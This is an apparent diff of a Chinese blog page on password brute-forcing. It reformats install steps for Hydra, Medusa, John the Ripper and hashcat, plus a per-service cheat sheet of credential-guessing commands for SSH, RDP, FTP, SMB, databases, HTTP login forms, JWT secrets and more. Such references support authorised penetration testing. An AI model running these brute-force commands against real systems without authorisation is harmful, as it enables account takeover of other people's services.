@@ -585,7 +585,11 @@
 </li>
 </ul>
 <h3 id="2-在线爆破"><a href="#2-在线爆破" class="headerlink" title="2. 在线爆破"></a>2. 在线爆破</h3><h4 id="a-Hydra"><a href="#a-Hydra" class="headerlink" title="a. Hydra"></a>a. Hydra</h4><p><strong>安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/vanhauser-thc/thc-hydra.git</span><br><span class="line"></span><br><span class="line">$ cd thc-hydra</span><br><span class="line"></span><br><span class="line">$ ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ git clone https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra.git
+
+$ cd thc-hydra
+
+$ .&#x2F;configure &amp;&amp; make &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>常用参数</strong></p>
 <table>
@@ -645,10 +649,18 @@
 </tr>
 </tbody></table>
 <h4 id="b-Medusa"><a href="#b-Medusa" class="headerlink" title="b. Medusa"></a>b. Medusa</h4><p><strong>安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y install libssh2-devel libssh2-devel libtool libtool-ltdl libtool-ltdl-devel</span><br><span class="line"></span><br><span class="line">$ yum groupinstall -y &#x27;development tools&#x27;</span><br><span class="line"></span><br><span class="line">$ wget http://foofus.net/goons/jmk/tools/medusa-2.2.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf medusa-2.2.tar.gz &amp;&amp; cd medusa-2.2</span><br><span class="line"></span><br><span class="line">$ ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ yum -y install libssh2-devel libssh2-devel libtool libtool-ltdl libtool-ltdl-devel
+
+$ yum groupinstall -y &#39;development tools&#39;
+
+$ wget http:&#x2F;&#x2F;foofus.net&#x2F;goons&#x2F;jmk&#x2F;tools&#x2F;medusa-2.2.tar.gz
+
+$ tar zxvf medusa-2.2.tar.gz &amp;&amp; cd medusa-2.2
+
+$ .&#x2F;configure &amp;&amp; make &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>语法</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>参数选项</strong></p>
 <table>
@@ -760,68 +772,168 @@
 </tr>
 </tbody></table>
 <h3 id="3-离线爆破"><a href="#3-离线爆破" class="headerlink" title="3. 离线爆破"></a>3. 离线爆破</h3><h4 id="a-John-the-Ripper"><a href="#a-John-the-Ripper" class="headerlink" title="a. John the Ripper"></a>a. John the Ripper</h4><p><strong>安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://www.openwall.com/john/k/john-1.9.0.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf john-1.9.0.tar.gz &amp;&amp; cd john-1.9.0</span><br><span class="line"></span><br><span class="line">$ make &amp;&amp; make clean linux-x86-64</span><br><span class="line"></span><br><span class="line">$ alias john=&#x27;/usr/local/john-1.9.0/run/john&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ wget https:&#x2F;&#x2F;www.openwall.com&#x2F;john&#x2F;k&#x2F;john-1.9.0.tar.gz
+
+$ tar zxvf john-1.9.0.tar.gz &amp;&amp; cd john-1.9.0
+
+$ make &amp;&amp; make clean linux-x86-64
+
+$ alias john&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;john-1.9.0&#x2F;run&#x2F;john&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="b-hashcat"><a href="#b-hashcat" class="headerlink" title="b. hashcat"></a>b. hashcat</h4><p><strong>安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://hashcat.net/files/hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ wget https:&#x2F;&#x2F;hashcat.net&#x2F;files&#x2F;hashcat-6.1.1.tar.gz
 
-<h2 id="0x03-爆破实战"><a href="#0x03-爆破实战" class="headerlink" title="0x03 爆破实战"></a>0x03 爆破实战</h2><h3 id="1-AJP"><a href="#1-AJP" class="headerlink" title="1. AJP"></a>1. AJP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ajp-brute -p 8009 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+$ tar zxvf hashcat-6.1.1.tar.gz
 
-<h3 id="2-CouchDB"><a href="#2-CouchDB" class="headerlink" title="2. CouchDB"></a>2. CouchDB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/couchdb/couchdb_login</span><br><span class="line">hydra -L /usr/share/brute/wordlists/simple-users.txt -P /usr/share/brute/wordlists/password.lst localhost -s 5984 http-get /</span><br></pre></td></tr></table></figure>
+$ make &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="3-Docker-Registry"><a href="#3-Docker-Registry" class="headerlink" title="3. Docker Registry"></a>3. Docker Registry</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-爆破实战"><a href="#0x03-爆破实战" class="headerlink" title="0x03 爆破实战"></a>0x03 爆破实战</h2><h3 id="1-AJP"><a href="#1-AJP" class="headerlink" title="1. AJP"></a>1. AJP</h3><pre class="line-numbers language-none"><code class="language-none">nmap --script ajp-brute -p 8009 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="4-Elasticsearch"><a href="#4-Elasticsearch" class="headerlink" title="4. Elasticsearch"></a>4. Elasticsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /</span><br></pre></td></tr></table></figure>
+<h3 id="2-CouchDB"><a href="#2-CouchDB" class="headerlink" title="2. CouchDB"></a>2. CouchDB</h3><pre class="line-numbers language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;couchdb&#x2F;couchdb_login
+hydra -L &#x2F;usr&#x2F;share&#x2F;brute&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brute&#x2F;wordlists&#x2F;password.lst localhost -s 5984 http-get &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="5-FTP"><a href="#5-FTP" class="headerlink" title="5. FTP"></a>5. FTP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp</span><br><span class="line">ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp</span><br></pre></td></tr></table></figure>
+<h3 id="3-Docker-Registry"><a href="#3-Docker-Registry" class="headerlink" title="3. Docker Registry"></a>3. Docker Registry</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt  -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst 10.10.10.10 -s 5000 https-get &#x2F;v2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="6-HTTP-Basic-Auth"><a href="#6-HTTP-Basic-Auth" class="headerlink" title="6. HTTP Basic Auth"></a>6. HTTP Basic Auth</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/</span><br><span class="line"># Use https-get mode for httpS</span><br><span class="line">medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10</span><br></pre></td></tr></table></figure>
+<h3 id="4-Elasticsearch"><a href="#4-Elasticsearch" class="headerlink" title="4. Elasticsearch"></a>4. Elasticsearch</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst localhost -s 9200 http-get &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="7-HTTP-Post-Form"><a href="#7-HTTP-Post-Form" class="headerlink" title="7. HTTP - Post Form"></a>7. HTTP - Post Form</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form &quot;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&quot; -V</span><br><span class="line"># Use https-post-form mode for httpS</span><br></pre></td></tr></table></figure>
+<h3 id="5-FTP"><a href="#5-FTP" class="headerlink" title="5. FTP"></a>5. FTP</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
+ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="8-HTTP-CMS"><a href="#8-HTTP-CMS" class="headerlink" title="8. HTTP - CMS"></a>8. HTTP - CMS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmsmap -f W/J/D/M -u a -p a https://wordpress.com</span><br></pre></td></tr></table></figure>
+<h3 id="6-HTTP-Basic-Auth"><a href="#6-HTTP-Basic-Auth" class="headerlink" title="6. HTTP Basic Auth"></a>6. HTTP Basic Auth</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst sizzle.htb.local http-get &#x2F;certsrv&#x2F;
+# Use https-get mode for httpS
+medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:&#x2F;path&#x2F;to&#x2F;auth -T 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="9-IMAP"><a href="#9-IMAP" class="headerlink" title="9. IMAP"></a>9. IMAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V</span><br><span class="line">hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V</span><br><span class="line">nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="7-HTTP-Post-Form"><a href="#7-HTTP-Post-Form" class="headerlink" title="7. HTTP - Post Form"></a>7. HTTP - Post Form</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst domain.htb  http-post-form &quot;&#x2F;path&#x2F;index.php:name&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;enter&#x3D;Sign+in:Login name or password is incorrect&quot; -V
+# Use https-post-form mode for httpS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="10-IRC"><a href="#10-IRC" class="headerlink" title="10. IRC"></a>10. IRC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="8-HTTP-CMS"><a href="#8-HTTP-CMS" class="headerlink" title="8. HTTP - CMS"></a>8. HTTP - CMS</h3><pre class="line-numbers language-none"><code class="language-none">cmsmap -f W&#x2F;J&#x2F;D&#x2F;M -u a -p a https:&#x2F;&#x2F;wordpress.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="11-JWT"><a href="#11-JWT" class="headerlink" title="11. JWT"></a>11. JWT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#hashcat</span><br><span class="line">hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt</span><br><span class="line"></span><br><span class="line">#https://github.com/Sjord/jwtcrack</span><br><span class="line">python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">#John</span><br><span class="line">john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256</span><br><span class="line"></span><br><span class="line">#https://github.com/ticarpi/jwt_tool</span><br><span class="line">python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;</span><br><span class="line"></span><br><span class="line">#https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8</span><br><span class="line"></span><br><span class="line">#https://github.com/mazen160/jwt-pwn</span><br><span class="line">python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt</span><br><span class="line"></span><br><span class="line">#https://github.com/lmammino/jwt-cracker</span><br><span class="line">jwt-cracker &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&quot; &quot;abcdefghijklmnopqrstuwxyz&quot; 6</span><br></pre></td></tr></table></figure>
+<h3 id="9-IMAP"><a href="#9-IMAP" class="headerlink" title="9. IMAP"></a>9. IMAP</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l USERNAME -P &#x2F;path&#x2F;to&#x2F;passwords.txt -f &lt;IP&gt; imap -V
+hydra -S -v -l USERNAME -P &#x2F;path&#x2F;to&#x2F;passwords.txt -s 993 -f &lt;IP&gt; imap -V
+nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="12-LDAP"><a href="#12-LDAP" class="headerlink" title="12. LDAP"></a>12. LDAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ldap-brute -p 389 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="10-IRC"><a href="#10-IRC" class="headerlink" title="10. IRC"></a>10. IRC</h3><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb&#x3D;&#x2F;path&#x2F;users.txt,passdb&#x3D;&#x2F;path&#x2F;pass.txt -p &lt;PORT&gt; &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="13-Mongo"><a href="#13-Mongo" class="headerlink" title="13. Mongo"></a>13. Mongo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;</span><br><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure>
+<h3 id="11-JWT"><a href="#11-JWT" class="headerlink" title="11. JWT"></a>11. JWT</h3><pre class="line-numbers language-none"><code class="language-none">#hashcat
+hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
 
-<h3 id="14-MySQL"><a href="#14-MySQL" class="headerlink" title="14. MySQL"></a>14. MySQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># hydra</span><br><span class="line">hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql</span><br><span class="line"></span><br><span class="line"># msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false</span><br><span class="line"></span><br><span class="line"># medusa</span><br><span class="line">medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql</span><br></pre></td></tr></table></figure>
+#https:&#x2F;&#x2F;github.com&#x2F;Sjord&#x2F;jwtcrack
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
 
-<h3 id="15-PostgreSQL"><a href="#15-PostgreSQL" class="headerlink" title="15. PostgreSQL"></a>15. PostgreSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres</span><br><span class="line">medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres</span><br><span class="line">ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432</span><br><span class="line">patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+#John
+john jwt.txt --wordlist&#x3D;wordlists.txt --format&#x3D;HMAC-SHA256
 
-<h3 id="16-RDP"><a href="#16-RDP" class="headerlink" title="16. RDP"></a>16. RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;</span><br><span class="line">hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;</span><br></pre></td></tr></table></figure>
+#https:&#x2F;&#x2F;github.com&#x2F;ticarpi&#x2F;jwt_tool
+python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
 
-<h3 id="17-Redis"><a href="#17-Redis" class="headerlink" title="17. Redis"></a>17. Redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/redis/redis_login</span><br><span class="line">nmap --script redis-brute -p 6379 &lt;IP&gt;</span><br><span class="line">hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default</span><br></pre></td></tr></table></figure>
+#https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-cracker
+.&#x2F;jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
 
-<h3 id="18-Rexec"><a href="#18-Rexec" class="headerlink" title="18. Rexec"></a>18. Rexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+#https:&#x2F;&#x2F;github.com&#x2F;mazen160&#x2F;jwt-pwn
+python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
 
-<h3 id="19-Rlogin"><a href="#19-Rlogin" class="headerlink" title="19. Rlogin"></a>19. Rlogin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+#https:&#x2F;&#x2F;github.com&#x2F;lmammino&#x2F;jwt-cracker
+jwt-cracker &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&quot; &quot;abcdefghijklmnopqrstuwxyz&quot; 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="20-Rsh"><a href="#20-Rsh" class="headerlink" title="20. Rsh"></a>20. Rsh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+<h3 id="12-LDAP"><a href="#12-LDAP" class="headerlink" title="12. LDAP"></a>12. LDAP</h3><pre class="line-numbers language-none"><code class="language-none">nmap --script ldap-brute -p 389 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="21-Rsync"><a href="#21-Rsync" class="headerlink" title="21. Rsync"></a>21. Rsync</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="13-Mongo"><a href="#13-Mongo" class="headerlink" title="13. Mongo"></a>13. Mongo</h3><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
+use auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="22-SMB"><a href="#22-SMB" class="headerlink" title="22. SMB"></a>22. SMB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-brute -p 445 &lt;IP&gt;</span><br><span class="line">hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1</span><br></pre></td></tr></table></figure>
+<h3 id="14-MySQL"><a href="#14-MySQL" class="headerlink" title="14. MySQL"></a>14. MySQL</h3><pre class="line-numbers language-none"><code class="language-none"># hydra
+hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
 
-<h3 id="23-Socks"><a href="#23-Socks" class="headerlink" title="23. Socks"></a>23. Socks</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+# msfconsole
+msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login; set VERBOSE false
 
-<h3 id="24-SSH"><a href="#24-SSH" class="headerlink" title="24. SSH"></a>24. SSH</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh</span><br><span class="line">ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh</span><br><span class="line">patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=&#x27;Authentication failed&#x27;</span><br></pre></td></tr></table></figure>
+# medusa
+medusa -h &lt;IP&#x2F;Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
